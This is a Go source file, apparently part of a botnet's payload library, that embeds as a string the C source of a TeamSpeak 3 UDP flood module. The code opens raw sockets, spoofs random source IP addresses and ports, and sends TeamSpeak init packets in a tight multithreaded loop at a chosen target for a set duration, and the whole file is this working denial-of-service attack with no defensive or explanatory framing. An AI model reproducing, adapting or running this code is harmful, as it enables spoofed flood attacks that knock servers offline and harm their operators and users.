package payloads

var UDPTS = `
// ==================== UDP XTS3 (TeamSpeak 3) FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE_UDX 8192
#define PHI_UDX 0x9e3779b9

static uint32_t Q_udx[4096], c_udx = 362436;
static unsigned int udx_port;
static int udx_attack_running = 0;
static pthread_t udx_threads[100];

void init_rand_udx(uint32_t x) {
    int i;
    Q_udx[0] = x;
    Q_udx[1] = x + PHI_UDX;
    Q_udx[2] = x + PHI_UDX + PHI_UDX;
    for (i = 3; i < 4096; i++) { Q_udx[i] = Q_udx[i - 3] ^ Q_udx[i - 2] ^ PHI_UDX ^ i; }
}

uint32_t rand_cmwc_udx(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q_udx[i] + c_udx;
    c_udx = (t >> 32);
    x = t + c_udx;
    if (x < c_udx) { x++; c_udx++; }
    return (Q_udx[i] = r - x);
}

unsigned short csum_udx(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void setup_ip_header_udx(struct iphdr *iph, uint32_t dest_ip) {
    iph->ihl = 5; iph->version = 4; iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 34;
    iph->id = htonl(rand_cmwc_udx() % 54321);
    iph->frag_off = 0; iph->ttl = 128;
    iph->protocol = IPPROTO_UDP; iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
    iph->daddr = dest_ip;
}

void setup_udp_header_udx(struct udphdr *udph, int port) {
    udph->source = htons(rand_cmwc_udx() % 65535);
    udph->dest = htons(port);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), 
           "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 34);
    udph->len = htons(sizeof(struct udphdr) + 34);
}

void *udx_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    
    char datagram[MAX_PACKET_SIZE_UDX];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0) return NULL;
    
    init_rand_udx(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE_UDX);
    setup_ip_header_udx(iph, sin.sin_addr.s_addr);
    setup_udp_header_udx(udph, port);
    
    int tmp = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    
    time_t start = time(NULL);
    
    while(udx_attack_running && time(NULL) - start < duration) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        udph->source = htons(rand_cmwc_udx() % 65535);
        iph->saddr = (rand_cmwc_udx() >> 24 & 0xFF) << 24 | (rand_cmwc_udx() >> 16 & 0xFF) << 16 | (rand_cmwc_udx() >> 8 & 0xFF) << 8 | (rand_cmwc_udx() & 0xFF);
        iph->id = htonl(rand_cmwc_udx() % 54321);
        iph->check = csum_udx((unsigned short *)datagram, iph->tot_len >> 1);
    }
    close(s);
    return NULL;
}

void start_udx_attack(char *target, int port, int threads, int duration_sec) {
    if(udx_attack_running) return;
    udx_port = port;
    udx_attack_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    
    for(int i = 0; i < threads; i++) {
        pthread_create(&udx_threads[i], NULL, udx_flood, arg);
    }
    
    sleep(duration_sec);
    udx_attack_running = 0;
    for(int i = 0; i < threads; i++) {
        pthread_join(udx_threads[i], NULL);
    }
    free(arg);
}

void stop_udx_attack() { udx_attack_running = 0; }
// ==================== END UDP XTS3 MODULE ====================
`